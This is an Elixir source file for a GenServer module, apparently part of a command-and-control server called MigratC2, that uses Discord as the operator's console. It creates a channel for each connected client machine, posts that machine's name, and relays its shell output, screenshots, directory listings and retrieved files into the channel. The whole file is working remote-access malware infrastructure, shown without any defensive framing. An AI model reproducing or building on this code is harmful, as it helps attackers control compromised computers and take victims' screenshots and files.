defmodule Discord.Updater do
  use GenServer
  require Logger

  alias Nostrum.Api

  @server_id Nostrum.Snowflake.cast!("966092445811109918")
  @category_id Nostrum.Snowflake.cast!("1212939909397217311")

  def start_link(default) do
    GenServer.start_link(__MODULE__, default)
  end

  @impl true
  def init(state) do
    MigratC2.LiveUpdate.subscibe_new_connection()

    channels = Api.get_guild_channels!(@server_id)
    channels = channels
    |> Enum.filter(fn c -> c.parent_id == @category_id end)
    |> Enum.map(fn c -> {c.id, c.name} end)
    Logger.debug("Discord.Updater init channels: #{inspect(channels)}")

    {:ok, state}
  end

  @impl true
  def handle_info(:update, state) do
    channels = Api.get_guild_channels!(@server_id)
    |> Enum.filter(fn c -> c.parent_id == @category_id end)

    connections = Connections.Registry.get_all
    |> Enum.filter(fn {_, connection} -> connection.connected end)

    # remove channels without connections
    channels |> Enum.each(fn channel ->
      if not (connections |> Enum.any?(fn {_, connection} ->
        connection.ident.id == channel.name
      end)) do
        Logger.debug("Discord.Updater handle_info(:update, state) channel without connection, deleting it: #{channel.name}")
        MigratC2.LiveUpdate.unsubscribe_id(channel.name)
        Api.delete_channel!(channel.id)
      end
    end)

    #add channels for new connections
    connections |> Enum.each(fn {_, connection} ->
      if not (channels |> Enum.any?(fn channel ->
        channel.name == connection.ident.id
      end)) do
        Logger.debug("Discord.Updater handle_info(:update, state) new connection, creating channel: #{connection.ident.id}")
        newchannel = Api.create_guild_channel!(@server_id, name: connection.ident.id, topic: connection.ident.computerName, parent_id: @category_id)
        Api.create_message!(newchannel.id, "Connected Client: #{connection.ident.id}\nComputer Name: #{connection.ident.computerName}")
        MigratC2.LiveUpdate.subscribe_id(connection.ident.id)
      end
    end)



    {:noreply, state}
  end

  @impl true
  def handle_info({:screenshot, _img}, state) do
    Logger.debug("Discord.Updater handle_info({:screenshot, img}, stack)")
    {:noreply, state}
  end

  @impl true
  def handle_info({:shellmessage, id, msg}, state) do
    cid = get_channel(id).id
    Api.create_message!(cid, msg)

    {:noreply, state}
  end

  @impl true
  def handle_info({:screenshot, id, img}, state) do
    cid = get_channel(id)
    {:ok, img} = Base.decode64(img)
    Api.create_message!(cid, file: %{name: "screenshot.png", body: img})

    {:noreply, state}
  end

  @impl true
  def handle_info({:command_response, id, :get_directory, data}, state) do
    cid = get_channel(id).id
    Api.create_message!(cid, "```\n#{Tabula.render_table(data.files)}\n```")

    {:noreply, state}
  end

  @impl true
  def handle_info({:command_response, id, :get_file, file}, state) do
    cid = get_channel(id).id
    Api.create_message!(cid, file: %{name: file.path, body: file.data})

    {:noreply, state}
  end

  defp get_channel(id) do
    channel = Api.get_guild_channels!(@server_id)
    |> Enum.filter(fn c -> c.name == id end)

    if Enum.count(channel) == 1 do
      Enum.at(channel, 0)
    else
      Logger.warning("Discord.Updater get_channel(id) channel not found: #{id}")
      throw("channel not found or multiple found")
    end
  end

end
